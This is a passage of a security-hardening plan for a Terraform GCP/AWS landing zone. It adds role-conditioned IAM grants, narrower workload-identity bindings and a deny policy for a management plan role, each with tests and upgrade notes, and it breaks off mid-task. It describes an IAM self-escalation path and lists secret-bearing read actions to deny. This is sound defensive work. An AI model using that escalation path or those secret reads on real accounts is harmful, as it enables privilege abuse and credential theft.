Why: `organization-apply` holds unconditional org `iam.securityAdmin` (`service_accounts.tf:85-88`). It can grant itself `roles/iam.denyAdmin` and delete `contain-admin-identity`. IAM deny cannot condition on the granted role (`control-plane/variables.tf:116-118`). An allow-side IAM condition can: `api.getAttribute('iam.googleapis.com/modifiedGrantsByRole', []).hasOnly([...])` is already used for projects-apply (`automation_delegation.tf:97`). Every role in the allowlist must be one the stage grants. `organizationAdmin` cannot be on it (it would restore unconditional `setIamPolicy`), so the org-admin group grant moves to `gcp-bootstrap`.

Self-lockout check:
- Break-glass and the human org admins are separate principals. The condition binds only `organization-apply`.
- Audit-config changes (`setIamPolicy` with only `auditConfigs` deltas) have an empty `modifiedGrantsByRole`, and `[].hasOnly(x)` is true, so they still work.
- A missing role would fail the `gcp-organization` apply with 403. A plan-time precondition in the organization stage compares every role it grants with the contract list from `gcp-bootstrap`, so a gap fails the plan first, with the role named.
- `gcp-bootstrap` runs as `bootstrap-apply` (unconditional `securityAdmin`, unchanged), so it can always repair the list.

- [ ] **Step 1: Write the failing tests**

Append to `modules/gcp/stages/bootstrap/tests/plan_assertions.tftest.hcl`:

```hcl
# organization-apply's org securityAdmin is conditional: it may grant or revoke
# only the roles the organization stage needs, never a guardrail-owner role.
run "organization_apply_security_admin_is_conditional" {
  command = plan

  variables {
    organization_apply_extra_grantable_roles = ["roles/logging.viewer"]
  }

  assert {
    condition = (
      length(google_organization_iam_member.stage_org_security_admin["organization-apply|roles/iam.securityAdmin"].condition) == 1 &&
      strcontains(google_organization_iam_member.stage_org_security_admin["organization-apply|roles/iam.securityAdmin"].condition[0].expression, "modifiedGrantsByRole', []).hasOnly([") &&
      strcontains(google_organization_iam_member.stage_org_security_admin["organization-apply|roles/iam.securityAdmin"].condition[0].expression, "'roles/secretmanager.admin'") &&
      strcontains(google_organization_iam_member.stage_org_security_admin["organization-apply|roles/iam.securityAdmin"].condition[0].expression, "'roles/logging.viewer'") &&
      !strcontains(google_organization_iam_member.stage_org_security_admin["organization-apply|roles/iam.securityAdmin"].condition[0].expression, "denyAdmin") &&
      !strcontains(google_organization_iam_member.stage_org_security_admin["organization-apply|roles/iam.securityAdmin"].condition[0].expression, "organizationAdmin")
    )
    error_message = "organization-apply's org iam.securityAdmin must carry a modifiedGrantsByRole.hasOnly condition without any guardrail-owner role."
  }

  assert {
    condition     = length(google_organization_iam_member.stage_org_security_admin["bootstrap-apply|roles/iam.securityAdmin"].condition) == 0
    error_message = "bootstrap-apply keeps unconditional securityAdmin (it repairs the allow-list and owns the org-admin grants)."
  }

  assert {
    condition     = contains(output.organization_apply_grantable_roles, "roles/logging.viewer") && !contains(output.organization_apply_grantable_roles, "roles/iam.denyAdmin")
    error_message = "the effective allow-list must be published for gcp-organization's precondition."
  }
}

run "org_admin_groups_granted_by_bootstrap" {
  command = plan

  variables {
    organization_admin_members = ["group:gcp-org-admins@example.com"]
  }

  assert {
    condition     = google_organization_iam_member.org_admins["group:gcp-org-admins@example.com"].role == "roles/resourcemanager.organizationAdmin"
    error_message = "gcp-bootstrap must own the standing organizationAdmin grant of the org-admin groups."
  }
}
```

Append to `modules/gcp/stages/bootstrap/tests/variables_validation.tftest.hcl`:

```hcl
run "grantable_roles_reject_guardrail_owner_roles" {
  command = plan

  variables {
    organization_apply_extra_grantable_roles = ["roles/iam.denyAdmin"]
  }

  expect_failures = [var.organization_apply_extra_grantable_roles]
}

run "grantable_roles_reject_org_admin" {
  command = plan

  variables {
    organization_apply_grantable_roles = ["roles/resourcemanager.organizationAdmin"]
  }

  expect_failures = [var.organization_apply_grantable_roles]
}
```

Append to `modules/gcp/stages/organization/tests/plan_assertions.tftest.hcl` (reuse the variables of the run at line 463; only the new inputs are shown):

```hcl
run "grants_outside_bootstrap_allowlist_fail_the_plan" {
  command = plan

  variables {
    organization_apply_grantable_roles = ["roles/billing.admin"]
    workload_service_accounts = {
      dev = {
        plan  = "acme-wl-dev-plan@acme-admin-project.iam.gserviceaccount.com"
        apply = "acme-wl-dev-apply@acme-admin-project.iam.gserviceaccount.com"
      }
    }
    workload_folder_roles = {
      plan  = ["roles/compute.viewer"]
      apply = ["roles/resourcemanager.projectIamAdmin"]
    }
  }

  override_module {
    target  = module.organization
    outputs = { organization_id = "123456789", organization_name = "organizations/123456789", organization_domain = "acme.io", organization_directory_customer_id = "C01abc123", folder_iam_members = {}, enabled_apis = [], organizational_units = {}, folders = { dev = { id = "111111111", name = "folders/111111111", display_name = "Development" }, shared = { id = "222222222", name = "folders/222222222", display_name = "Shared" } } }
  }

  expect_failures = [terraform_data.organization_apply_grants_allowed]
}

run "organization_stage_grants_no_org_admin" {
  command = plan

  assert {
    condition     = length(local.organization_module_admin_members) == 0 && !contains(local.organization_apply_granted_roles, "roles/resourcemanager.organizationAdmin")
    error_message = "gcp-organization must not grant roles/resourcemanager.organizationAdmin: it would restore unconditional setIamPolicy to the identity the guardrails contain."
  }
}
```

(Terraform 1.17 test assertions can read module locals. `modules/gcp/iam/organization` has no output for its admin members, so the test reads the local the stage passes in.)

- [ ] **Step 2: Run and confirm failure**

```bash
make test TEST_DIRS=modules/gcp/stages/bootstrap TERRAFORM="$TF"
make test TEST_DIRS=modules/gcp/stages/organization TERRAFORM="$TF"
```

Expected: undeclared-variable errors for the new inputs, a missing `org_admins` resource, a missing `terraform_data.organization_apply_grants_allowed`, and `organization_stage_grants_no_org_admin` failing because the org admin list is not empty.

- [ ] **Step 3: Implement**

`modules/gcp/stages/bootstrap/variables.tf`:

```hcl
locals {
  # Roles that remove or bypass landing-zone guardrails. Never grantable by
  # organization-apply.
  guardrail_owner_roles = [
    "roles/owner",
    "roles/iam.denyAdmin",
    "roles/iam.principalAccessBoundaryAdmin",
    "roles/iam.securityAdmin",
    "roles/iam.organizationRoleAdmin",
    "roles/resourcemanager.organizationAdmin",
    "roles/privilegedaccessmanager.admin",
  ]
}

variable "organization_apply_grantable_roles" {
  description = "Roles the gcp-organization apply SA may add or remove anywhere in the organization: its org-level iam.securityAdmin carries the condition modifiedGrantsByRole.hasOnly(<this list + organization_apply_extra_grantable_roles>). The default is every role the organization stage grants by default (billing admins, the workload non-delegable folder roles, projects-apply delegated folder IAM). Guardrail-owner roles are rejected."
  type        = list(string)
  default = [
    "roles/billing.admin",
    "roles/resourcemanager.folderIamAdmin",
    "roles/resourcemanager.projectIamAdmin",
    "roles/iam.serviceAccountAdmin",
    "roles/iam.serviceAccountKeyAdmin",
    "roles/iam.serviceAccountTokenCreator",
    "roles/iam.workloadIdentityPoolAdmin",
    "roles/iam.serviceAccountUser",
    "roles/secretmanager.admin",
    "roles/cloudkms.admin",
    "roles/storage.admin",
    "roles/run.admin",
    "roles/bigquery.admin",
    "roles/pubsub.admin",
    "roles/artifactregistry.admin",
    "roles/resourcemanager.projectCreator",
  ]
  nullable = false

  validation {
    condition     = length(setintersection(toset(var.organization_apply_grantable_roles), toset(local.guardrail_owner_roles))) == 0
    error_message = "organization_apply_grantable_roles must not contain a guardrail-owner role (owner, iam.denyAdmin, iam.principalAccessBoundaryAdmin, iam.securityAdmin, iam.organizationRoleAdmin, resourcemanager.organizationAdmin, privilegedaccessmanager.admin): organization-apply could grant it to itself and lift the deny policies."
  }
}

variable "organization_apply_extra_grantable_roles" {
  description = "Extra roles for organization_apply_grantable_roles: the folder group roles of environments[*].iam_group_role_bindings and the legacy terraform-admin folder roles. envs/gcp/bootstrap derives them from config/landing-zone.yaml."
  type        = list(string)
  default     = []
  nullable    = false

  validation {
    condition     = length(setintersection(toset(var.organization_apply_extra_grantable_roles), toset(local.guardrail_owner_roles))) == 0
    error_message = "organization_apply_extra_grantable_roles must not contain a guardrail-owner role (owner, iam.denyAdmin, iam.principalAccessBoundaryAdmin, iam.securityAdmin, iam.organizationRoleAdmin, resourcemanager.organizationAdmin, privilegedaccessmanager.admin)."
  }
}

variable "organization_admin_members" {
  description = "Members (group:...) that hold the standing roles/resourcemanager.organizationAdmin. Granted here by bootstrap-apply, not by gcp-organization, because organization-apply may not grant organizationAdmin."
  type        = list(string)
  default     = []
  nullable    = false
}
```

`modules/gcp/stages/bootstrap/service_accounts.tf`, in `locals` add:

```hcl
  organization_apply_grantable_roles = sort(distinct(concat(var.organization_apply_grantable_roles, var.organization_apply_extra_grantable_roles)))
```

and replace `stage_org_security_admin` (lines 280-287) with:

```hcl
resource "google_organization_iam_member" "stage_org_security_admin" {
  # checkov:skip=CKV_GCP_45:iam.securityAdmin is restricted to the bootstrap and organization APPLY identities (apply-phase WIF only); organization-apply's grant is conditional (modifiedGrantsByRole.hasOnly).
  for_each = { for k, v in local.org_grants : k => v if v.role == "roles/iam.securityAdmin" }

  org_id = var.org_id
  role   = each.value.role #tfsec:ignore:google-iam-no-privileged-service-accounts - bootstrap + organization APPLY SAs only; organization-apply is role-conditioned
  member = "serviceAccount:${local.stage_sa_email[each.value.sa_key]}"

  # organization-apply may add or remove only the roles the organization stage
  # grants. Without this it could grant itself roles/iam.denyAdmin and delete
  # the deny policy that contains it (deny cannot condition on the role).
  dynamic "condition" {
    for_each = each.value.sa_key == "organization-apply" ? [1] : []
    content {
      title       = "organization_apply_grantable_roles"
      description = "organization-apply may grant only the organization stage's roles, never a guardrail-owner role"
      expression  = "api.getAttribute('iam.googleapis.com/modifiedGrantsByRole', []).hasOnly([${join(", ", [for r in local.organization_apply_grantable_roles : "'${r}'"])}])"
    }
  }
}

# Standing org admin for the admin groups. gcp-organization used to grant it,
# but organizationAdmin restores unconditional setIamPolicy, so the identity
# the guardrails contain may not hand it out.
resource "google_organization_iam_member" "org_admins" { #tfsec:ignore:google-iam-no-user-granted-permissions
  for_each = toset(var.organization_admin_members)

  org_id = var.org_id
  role   = "roles/resourcemanager.organizationAdmin"
  member = each.value
}
```

`modules/gcp/stages/bootstrap/outputs.tf`:

```hcl
output "organization_apply_grantable_roles" {
  description = "Roles organization-apply may grant (its org securityAdmin condition). gcp-organization checks every grant against this list at plan time."
  value       = local.organization_apply_grantable_roles
}
```

`envs/gcp/bootstrap/main.tf`, in `module "bootstrap"` (`local.cfg.organization_admin_groups` is already decoded at `envs/gcp/bootstrap/config.tf:30`):

```hcl
  organization_admin_members = [for g in coalesce(local.cfg.organization_admin_groups, []) : "group:${g}"]
  organization_apply_extra_grantable_roles = sort(distinct(flatten([
    for e in values(local.environments) : [for g, roles in e.iam_group_role_bindings : tolist(roles)]
  ])))
```

Create `envs/gcp/bootstrap/imports.tf` (one-time adoption of the bindings `gcp-organization` used to own; harmless once adopted, remove it in the next release):

```hcl
import {
  for_each = toset([for g in coalesce(local.cfg.organization_admin_groups, []) : "group:${g}"])
  to       = module.bootstrap.google_organization_iam_member.org_admins[each.key]
  id       = "${data.google_organization.org.org_id} roles/resourcemanager.organizationAdmin ${each.key}"
}
```

Add `organization_apply_grantable_roles = module.bootstrap.organization_apply_grantable_roles` to `local.contract` in `envs/gcp/bootstrap/outputs.tf:11` and `organization_apply_grantable_roles = list(string)` to the `contract` output type (line 46).

`modules/gcp/stages/organization/variables.tf`:

```hcl
variable "organization_apply_grantable_roles" {
  description = "gcp-bootstrap contract organization_apply_grantable_roles: the roles organization-apply's org securityAdmin condition admits. A precondition fails the plan when this stage would grant any other role (the apply would get 403). Null = no check (older bootstrap contract)."
  type        = list(string)
  default     = null
}
```

`modules/gcp/stages/organization/main.tf`: add `organization_module_admin_members = []` to the first `locals` block, and in `module "organization"` set `org_admin_members = local.organization_module_admin_members`. Keep `local.org_admin_members` only for the PAM and break-glass paths that read it. Add:

```hcl
locals {
  # Every role this stage grants or revokes through setIamPolicy on the org or
  # a folder (organization-apply's securityAdmin condition must admit each).
  organization_apply_granted_roles = toset(concat(
    length(local.billing_admin_members) > 0 ? ["roles/billing.admin"] : [],
    flatten([for k, e in var.environments : [for g, roles in e.iam_group_role_bindings : tolist(roles)]]),
    [for g in values(local.non_delegable_workload_grants) : g.role],
    length(local.delegated_folder_iam_targets) > 0 ? ["roles/resourcemanager.folderIamAdmin"] : [],
    var.gcp.enable_legacy_admin_folder_roles ? ["roles/resourcemanager.folderAdmin", "roles/resourcemanager.projectCreator", "roles/billing.projectManager", "roles/compute.networkAdmin"] : [],
  ))
  organization_apply_missing_roles = var.organization_apply_grantable_roles == null ? [] : sort(tolist(setsubtract(local.organization_apply_granted_roles, toset(var.organization_apply_grantable_roles))))
}

resource "terraform_data" "organization_apply_grants_allowed" {
  lifecycle {
    precondition {
      condition     = length(local.organization_apply_missing_roles) == 0
      error_message = "This stage grants roles that organization-apply's org securityAdmin condition does not admit: ${join(", ", local.organization_apply_missing_roles)}. The apply would fail with 403. Add them to gcp.organization_apply_extra_grantable_roles (or the folder's iam_group_role_bindings) and apply gcp-bootstrap first. Guardrail-owner roles can never be added."
    }
  }
}
```

`envs/gcp/organization/main.tf`: pass `organization_apply_grantable_roles = try(local.bootstrap.organization_apply_grantable_roles, null)`.

`envs/gcp/bootstrap/config.tf` and `config/landing-zone.schema.json`: add the optional key `gcp.organization_apply_extra_grantable_roles` (array of strings), and merge it into `organization_apply_extra_grantable_roles` above with `try(local.lz.gcp.organization_apply_extra_grantable_roles, [])`.

- [ ] **Step 4: Run and confirm pass**

```bash
make test TEST_DIRS=modules/gcp/stages/bootstrap TERRAFORM="$TF"
make test TEST_DIRS=modules/gcp/stages/organization TERRAFORM="$TF"
make test TEST_DIRS=envs/gcp/bootstrap TERRAFORM="$TF"
make test TEST_DIRS=envs/gcp/organization TERRAFORM="$TF"
./scripts/check-contracts.sh
make docs
```

Expected: all pass. `check-contracts.sh` sees the new key in both the producer type and the value.

- [ ] **Step 5: Docs**

- `UPGRADING.md` `## Unreleased`, ordered steps: "**organization-apply's org securityAdmin is conditional (GCP, breaking).** (1) In `gcp-organization`, remove the org-admin grants from state without deleting them: `make state-rm-gcp-organization ADDR='module.organization.google_organization_iam_member.org_admins'`. (2) Apply `gcp-bootstrap`: the `import` block in `envs/gcp/bootstrap/imports.tf` (Step 3) adopts the same bindings, and the condition is added. (3) Plan `gcp-organization`: a precondition names any role the condition does not admit. Add it to `gcp.organization_apply_extra_grantable_roles`, re-apply `gcp-bootstrap`, then apply `gcp-organization`. Skipping step 1 makes step 3 delete the org-admin bindings."
- `docs/known-gaps.md:281-284` (G14 residual): replace "`iam.securityAdmin` on the organization apply SA can still grant itself `denyAdmin`; alert-only" with "organization-apply's org `iam.securityAdmin` is conditional (`modifiedGrantsByRole.hasOnly`), so it can no longer grant itself `denyAdmin`. **Residuals:** (a) with `enable_pam`, organization-apply holds `privilegedaccessmanager.admin` and can edit the JIT entitlement's eligible principals and roles; PAM grants are made by the PAM service agent, not by organization-apply's `setIamPolicy`. Alert `pam_entitlement_change` covers it; move PAM ownership to `gcp-guardrails` in a later change. (b) The guardrail alerts live in the admin project, where organization-apply has `monitoring.editor`. Deleting them no longer enables the escalation, so they are defence in depth. (c) `modifiedGrantsByRole` acceptance on the organization node needs real-org validation."
- `modules/gcp/monitoring/control-plane/variables.tf:115-118`: change the comment to "organization-apply's securityAdmin is role-conditioned (gcp-bootstrap), so this alert is defence in depth for a human or break-glass grant."
- `CHANGELOG.md` `#### Security`: "**organization-apply can no longer grant itself a guardrail-owner role (SEC-3).**"

- [ ] **Step 6: Commit**

```bash
git add modules/gcp envs/gcp config/landing-zone.schema.json docs/known-gaps.md UPGRADING.md CHANGELOG.md
git commit -m "feat(gcp)!: condition organization-apply's securityAdmin on the roles it may grant

BREAKING CHANGE: the org-admin group grant moves to gcp-bootstrap; run the
state rm step in UPGRADING.md before applying gcp-organization."
```

---

### Task 7: SEC-5: GCP app-deploy WIF never trusts a whole repository

**Files:**
- Modify: `modules/gcp/stages/app-services/main.tf:145-162` (`deploy_wif_member`)
- Modify: `modules/gcp/stages/app-services/variables.tf:277` area (the `github` object description)
- Test: `modules/gcp/stages/app-services/tests/plan_assertions.tftest.hcl:82-86` (existing default-case assertion), new run
- Docs: `UPGRADING.md`, `CHANGELOG.md`, `docs/known-gaps.md` (none if fully closed)

Self-lockout check: none for infrastructure. A GitHub workflow without an `environment:` key stops deploying after the change. The UPGRADING step tells the owner to add `environment: <env>` to the deploy job or to set `ref`.

- [ ] **Step 1: Write the failing test**

Change the assertion at `plan_assertions.tftest.hcl:84` to:

```hcl
    condition     = google_service_account_iam_member.deploy_wif["api"].member == "principalSet://iam.googleapis.com/projects/222222222222/locations/global/workloadIdentityPools/apps-dev/attribute.repo_env/123456789/dev"
    error_message = "with neither ref nor environment, the deploy SA must be pinned to the GitHub environment named after var.environment (as AWS app-services does), never to the whole repository."
```

Append:

```hcl
run "no_service_binding_is_repository_wide" {
  command = plan

  variables {
    enable_app_deploy_wif = true
    services = {
      api = { github = { repository_id = "123" } }
      web = { github = { repository_id = "456", ref = "refs/heads/main" } }
    }
  }

  assert {
    condition     = alltrue([for k, m in google_service_account_iam_member.deploy_wif : !strcontains(m.member, "/attribute.repository_id/")])
    error_message = "no deploy SA may trust every branch and environment of a repository."
  }

  assert {
    condition     = endswith(google_service_account_iam_member.deploy_wif["web"].member, "/attribute.repo_ref/456/refs/heads/main")
    error_message = "a service that sets only ref stays pinned to that ref."
  }
}
```

- [ ] **Step 2: Run and confirm failure**

```bash
make test TEST_DIRS=modules/gcp/stages/app-services TERRAFORM="$TF"
```

Expected: `one_service_full_golden_path` fails on the member string, `no_service_binding_is_repository_wide` fails on the first assertion.

- [ ] **Step 3: Implement**

Replace `deploy_wif_member` (lines 152-162) with:

```hcl
  # Neither ref nor environment => the GitHub environment named after
  # var.environment (the AWS app-services default). A binding on the bare
  # repository_id would trust every branch, tag and environment of the repo.
  deploy_github_environment = {
    for k, s in local.services_with_github : k => (
      s.github.environment != null ? s.github.environment : (s.github.ref == null ? var.environment : null)
    )
  }
  deploy_wif_member = {
    for k, s in local.services_with_github : k => (
      s.github.ref != null && local.deploy_github_environment[k] != null
      ? "principalSet://iam.googleapis.com/${local.wif_pool_name}/attribute.repo_ref_env/${s.github.repository_id}/${s.github.ref}/${local.deploy_github_environment[k]}"
      : s.github.ref != null
      ? "principalSet://iam.googleapis.com/${local.wif_pool_name}/attribute.repo_ref/${s.github.repository_id}/${s.github.ref}"
      : "principalSet://iam.googleapis.com/${local.wif_pool_name}/attribute.repo_env/${s.github.repository_id}/${local.deploy_github_environment[k]}"
    )
  }
```

In `variables.tf`, document on the `github` object: "`environment` null and `ref` null: the GitHub environment is `var.environment`. There is no repository-wide binding."

Run `make docs`.

- [ ] **Step 4: Run and confirm pass**

```bash
make test TEST_DIRS=modules/gcp/stages/app-services TERRAFORM="$TF"
make test TEST_DIRS=modules/gcp/stages/environment TERRAFORM="$TF"
make test TEST_DIRS=envs/gcp/workload TERRAFORM="$TF"
```

Expected: all pass. A failure in `environment` or `envs/gcp/workload` that asserts the old `attribute.repository_id` string is updated to the `repo_env/<id>/<env>` form in this task.

- [ ] **Step 5: Docs**

- `UPGRADING.md` `## Unreleased`: "**GCP app deploy identity pins the environment (breaking).** A service with `github` but neither `ref` nor `environment` now trusts only GitHub environment `<env>` (the landing-zone environment key). Add `environment: <env>` to the deploy job, or set `ref`."
- `CHANGELOG.md` `#### Security`: "**GCP app-deploy WIF is never repository-wide (SEC-5).**"

- [ ] **Step 6: Commit**

```bash
git add modules/gcp/stages/app-services envs/gcp/workload/tests modules/gcp/stages/environment/tests UPGRADING.md CHANGELOG.md
git commit -m "fix(gcp)!: pin app-deploy WIF to the environment when no ref is set

BREAKING CHANGE: deploy jobs need a GitHub environment named after the env."
```

---

### Task 8: SEC-6: management-account phase-0 roles get the data-read deny and a safe default

**Files:**
- Modify: `templates/aws/bootstrap/phase0-management.yaml:29-37` (`TrustSecurityAndBackup` default), `:76-100` (`TfcMgmtPlanRole`, add `Policies`)
- Create: `scripts/tests/test-phase0-template.sh`
- Docs: `docs/runbooks/aws-bootstrap.md:60-95`, `docs/runbooks/aws-break-glass.md:53`, `UPGRADING.md`, `CHANGELOG.md`

Why: the member-account plan role has `plan_role_data_read_deny_actions` (`modules/aws/iam/tfc-oidc-baseline/main.tf:356-412`). The management plan role is plain `ReadOnlyAccess`. `TrustSecurityAndBackup` defaults to `"true"`, so a fresh stack lets `aws-security` and `aws-backup` apply as management admin.

Self-lockout check: no management-account root manages `aws_s3_object`, `aws_secretsmanager_secret_version`, `aws_ssm_parameter`, launch templates or CodeBuild (the only hit of that grep is `envs/aws/workload/main.tf`, a member account). So the deny breaks no management plan. `TrustSecurityAndBackup=false` is safe because the first `aws-organization` apply creates the dedicated `tfc-mgmt-aws-security-*` and `tfc-mgmt-aws-backup-*` roles (`aws-bootstrap.md:89`), and tfc-admin binds them before those workspaces run. `OrganizationBreakGlass` is unchanged.

- [ ] **Step 1: Write the failing test**

Create `scripts/tests/test-phase0-template.sh`:

```bash
#!/usr/bin/env bash
# phase0-management.yaml: the management plan role carries the same data-read
# deny as the member-account plan role, and security/backup are not trusted by
# the admin role by default.
#   bash scripts/tests/test-phase0-template.sh   (make test-scripts; needs PyYAML from yamllint)
set -euo pipefail
REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"

python3 - "${REPO_ROOT}" <<'PY'
import pathlib, re, sys, yaml

root = pathlib.Path(sys.argv[1])
tpl = yaml.safe_load((root / "templates/aws/bootstrap/phase0-management.yaml").read_text())
src = (root / "modules/aws/iam/tfc-oidc-baseline/main.tf").read_text()
block = re.search(r"plan_role_data_read_deny_actions = \[(.*?)\n  \]", src, re.S).group(1)
module_actions = set(re.findall(r'"([a-z0-9-]+:[A-Za-z0-9*]+)"', block))

fail = []
if tpl["Parameters"]["TrustSecurityAndBackup"]["Default"] != "false":
    fail.append("TrustSecurityAndBackup must default to \"false\"")

plan = tpl["Resources"]["TfcMgmtPlanRole"]["Properties"]
pols = {p["PolicyName"]: p["PolicyDocument"] for p in plan.get("Policies", [])}
deny = pols.get("data-read-deny")
if deny is None:
    fail.append("TfcMgmtPlanRole needs an inline data-read-deny policy")
else:
    stmts = deny["Statement"]
    actions = set()
    for s in stmts:
        if s["Effect"] == "Deny":
            actions |= set(s["Action"] if isinstance(s["Action"], list) else [s["Action"]])
    missing = sorted(module_actions - actions)
    if missing:
        fail.append(f"data-read-deny misses module actions: {missing}")
    if not any(s.get("Sid") == "DenyApiKeyValueReads" for s in stmts):
        fail.append("data-read-deny must deny API Gateway key value reads")

if fail:
    print("\n".join("  FAIL " + f for f in fail), file=sys.stderr)
    sys.exit(1)
print(f"phase0 template: ok ({len(module_actions)} deny actions in step with tfc-oidc-baseline)")
PY
```

- [ ] **Step 2: Run and confirm failure**

```bash
bash scripts/tests/test-phase0-template.sh
```

Expected: `FAIL TrustSecurityAndBackup must default to "false"` and `FAIL TfcMgmtPlanRole needs an inline data-read-deny policy`, exit 1.

- [ ] **Step 3: Implement**

In `phase0-management.yaml`, set `TrustSecurityAndBackup` `Default: "false"` and change its description to: "Also trust aws-security and aws-backup on the management ADMIN role. Default \"false\": the first aws-organization apply creates their dedicated tfc-mgmt-aws-security-*/ tfc-mgmt-aws-backup-* roles. Set \"true\" only for a recovery run, then set it back."

Add to `TfcMgmtPlanRole.Properties` (after `ManagedPolicyArns`):

```yaml
      # ReadOnlyAccess includes data-plane and secret-bearing reads. Same deny as
      # the member-account tfc-plan role (modules/aws/iam/tfc-oidc-baseline,
      # plan_role_data_read_deny_actions); scripts/tests/test-phase0-template.sh
      # keeps the two lists in step.
      Policies:
        - PolicyName: data-read-deny
          PolicyDocument:
            Version: "2012-10-17"
            Statement:
              - Sid: DenyDataPlaneReads
                Effect: Deny
                Action:
                  - "s3:GetObject*"
                  - "s3-object-lambda:GetObject*"
                  - "secretsmanager:GetSecretValue"
                  - "secretsmanager:BatchGetSecretValue"
                  - "ssm:GetParameter*"
                  - "kms:Decrypt"
                  - "kms:GenerateDataKey*"
                  - "ec2:GetPasswordData"
                  - "ec2:GetConsoleOutput"
                  - "ec2:GetConsoleScreenshot"
                  - "ec2:GetLaunchTemplateData"
                  - "ec2:DescribeLaunchTemplateVersions"
                  - "autoscaling:DescribeLaunchConfigurations"
                  - "glue:GetConnection"
                  - "glue:GetConnections"
                  - "dynamodb:GetItem"
                  - "dynamodb:BatchGetItem"
                  - "dynamodb:Query"
                  - "dynamodb:Scan"
                  - "dynamodb:PartiQLSelect"
                  - "dynamodb:GetRecords"
                  - "sqs:ReceiveMessage"
                  - "kinesis:GetRecords"
                  - "logs:GetLogEvents"
                  - "logs:FilterLogEvents"
                  - "logs:StartQuery"
                  - "logs:GetQueryResults"
                  - "logs:StartLiveTail"
                  - "rds-data:*"
                  - "redshift-data:GetStatementResult"
                  - "athena:GetQueryResults"
                  - "timestream:Select"
                  - "ecr:GetDownloadUrlForLayer"
                  - "ecr:BatchGetImage"
                  - "ecr:GetAuthorizationToken"
                  - "ssm:GetCommandInvocation"
                  - "logs:GetLogRecord"
                  - "rds:DownloadDBLogFilePortion"
                  - "es:ESHttpGet"
                  - "cassandra:Select"
                  - "codecommit:GitPull"
                  - "codecommit:GetFile"
                  - "codecommit:GetBlob"
                  - "codeartifact:ReadFromRepository"
                  - "codebuild:BatchGetProjects"
                  - "codebuild:BatchGetBuilds"
                  - "lambda:GetLayerVersion"
                  - "cognito-idp:DescribeUserPoolClient"
                  - "appsync:ListApiKeys"
                  - "states:GetExecutionHistory"
                  - "states:DescribeExecution"
                  - "lightsail:GetInstanceAccessDetails"
                  - "lightsail:GetRelationalDatabaseMasterUserPassword"
                  - "glacier:GetJobOutput"
                  - "elasticbeanstalk:DescribeConfigurationSettings"
                Resource: "*"
              - Sid: DenyApiKeyValueReads
                Effect: Deny
                Action: "apigateway:GET"
                Resource:
                  - Fn::Sub: "arn:${AWS::Partition}:apigateway:*::/apikeys"
                  - Fn::Sub: "arn:${AWS::Partition}:apigateway:*::/apikeys/*"
                  - Fn::Sub: "arn:${AWS::Partition}:apigateway:*::/usageplans/*/keys"
                  - Fn::Sub: "arn:${AWS::Partition}:apigateway:*::/usageplans/*/keys/*"
```

- [ ] **Step 4: Run and confirm pass**

```bash
python3 -m pip install --user --no-deps --require-hashes -r .github/requirements/yamllint.txt
bash scripts/tests/test-phase0-template.sh
make cfn-lint
make shellcheck
```

Expected: `phase0 template: ok (55 deny actions in step with tfc-oidc-baseline)` (55 is the length of `plan_role_data_read_deny_actions` today), `cfn-lint: templates OK`.

- [ ] **Step 5: Docs**

- `docs/runbooks/aws-bootstrap.md:60-95`: the stack now starts with `TrustSecurityAndBackup=false`. Replace "After aws-organization has created the dedicated roles, update the stack with `TrustSecurityAndBackup=false`" with "Apply `aws-organization` and bind the dedicated `tfc-mgmt-aws-security-*` and `tfc-mgmt-aws-backup-*` roles in tfc-admin before the first `aws-security` or `aws-backup` run. The admin role trusts only `aws-organization`." Add that `tfc-mgmt-plan` denies data-plane reads.
- `docs/runbooks/aws-break-glass.md:53`: unchanged command; add "An existing stack keeps its current value (`UsePreviousValue=true`)."
- `UPGRADING.md` `## Unreleased`: "**phase-0 management stack.** Update the stack to pick up the plan-role data-read deny. Existing stacks keep `TrustSecurityAndBackup` (`UsePreviousValue`); set it to `false` once the dedicated roles are bound."
- `CHANGELOG.md` `#### Security`: "**Management plan role denies data-plane reads; security/backup are not trusted by the admin role by default (SEC-6).**"

- [ ] **Step 6: Commit**

```bash
git add templates/aws/bootstrap/phase0-management.yaml scripts/tests/test-phase0-template.sh docs/runbooks UPGRADING.md CHANGELOG.md
git commit -m "fix(aws): deny data-plane reads on the management plan role"
```

---

### Task 9: SEC-8: production VPC-SC dry-run fails the plan unless waived

**Files:**
- Modify: `envs/gcp/workload/main.tf:298-307` (`check "vpc_sc_enforced_in_prod"`)
- Modify: `envs/gcp/workload/variables.tf` (new `production_vpc_sc_dry_run_waived` after `vpc_sc_enable_dry_run`, line 311)
- Test: `envs/gcp/workload/tests/default_plan.tftest.hcl:129-161` (`prod_without_enforced_perimeter_warns`), new run
- Docs: `docs/known-gaps.md` (G11 entry), `UPGRADING.md`, `CHANGELOG.md`, `examples/presets/prod-gcp-workload.tfvars` comment

Self-lockout check: the precondition stops a plan, it changes no resource. The waiver is a variable, so a first production rollout can still stage dry-run. Who can set it: workspace variables on a production workload are read-only for the platform team (`platform_custom_access.variables = "read"`, `envs/tfc-admin/main.tf:727`), so the waiver goes through `config/tfc-workspaces.yaml` (CODEOWNERS-reviewed) or a tfc-admin admin.

- [ ] **Step 1: Write the failing tests**

In `default_plan.tftest.hcl`, rename `prod_without_enforced_perimeter_warns` to `prod_without_enforced_perimeter_fails` and change its last line to:

```hcl
  expect_failures = [terraform_data.production_vpc_sc_enforced]
```

Append:

```hcl
run "prod_dry_run_waiver_allows_plan" {
  command = plan

  variables {
    environment                      = "prod"
    production_vpc_sc_dry_run_waived = true
  }

  override_data {
    target = data.terraform_remote_state.projects
    values = {
      outputs = {
        contract = {
          environment_config = {
            prod = {
              folder_id           = "folders/333"
              folder_name         = "Production"
              host_project_id     = "acme-prod-host-abcd"
              host_project_number = "333333333333"
              region              = "europe-west1"
              cidr_block          = "10.30.0.0/16"
              labels              = {}
              tag_value_ids       = { environment = "tagValues/3" }
            }
          }
        }
      }
    }
  }

  assert {
    condition     = length(terraform_data.production_vpc_sc_enforced) == 1
    error_message = "the waiver lets the plan through; the precondition resource still exists."
  }
}
```

- [ ] **Step 2: Run and confirm failure**

```bash
make test TEST_DIRS=envs/gcp/workload TERRAFORM="$TF"
```

Expected: `prod_without_enforced_perimeter_fails` fails ("Reference to undeclared resource"). `prod_dry_run_waiver_allows_plan` fails ("has not been declared").

- [ ] **Step 3: Implement**

`envs/gcp/workload/variables.tf`:

```hcl
variable "production_vpc_sc_dry_run_waived" {
